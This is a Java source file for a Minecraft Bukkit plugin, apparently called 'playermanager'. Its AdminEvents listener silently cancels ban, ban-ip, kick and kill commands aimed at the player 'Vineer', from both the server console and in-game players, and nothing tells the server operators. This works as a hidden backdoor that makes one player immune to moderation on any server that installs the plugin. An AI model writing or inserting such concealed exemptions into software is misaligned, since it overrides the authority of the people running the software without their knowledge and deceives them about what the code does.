package me.vineer.playermanager.events;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;

public class AdminEvents implements Listener {
    @EventHandler
    public void onServerCommand(ServerCommandEvent event) {
        String[] command = event.getCommand().split("[ ]+");
        if(command[0].equalsIgnoreCase("ban") && command[1].equalsIgnoreCase("Vineer")) {
            event.setCancelled(true);
        } else if(command[0].equalsIgnoreCase("kill") && command[1].equalsIgnoreCase("Vineer")) {
            event.setCancelled(true);
        } else if (command[0].equalsIgnoreCase("ban-ip") && command[1].equalsIgnoreCase("Vineer")) {
            event.setCancelled(true);
        } else if (command[0].equalsIgnoreCase("kick") && command[1].equalsIgnoreCase("Vineer")) {
            event.setCancelled(true);
        }
    }

    @EventHandler
    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        String[] command = event.getMessage().split("[ ]+");
        try {
            if(command[0].equalsIgnoreCase("/ban") && command[1].equalsIgnoreCase("Vineer")) {
                event.setCancelled(true);
            } else if(command[0].equalsIgnoreCase("/kill") && command[1].equalsIgnoreCase("Vineer")) {
                event.setCancelled(true);
            } else if (command[0].equalsIgnoreCase("/ban-ip") && command[1].equalsIgnoreCase("Vineer")) {
                event.setCancelled(true);
            } else if (command[0].equalsIgnoreCase("/kick") && command[1].equalsIgnoreCase("Vineer")) {
                event.setCancelled(true);
            }
        } catch (ArrayIndexOutOfBoundsException e) {}
    }
}
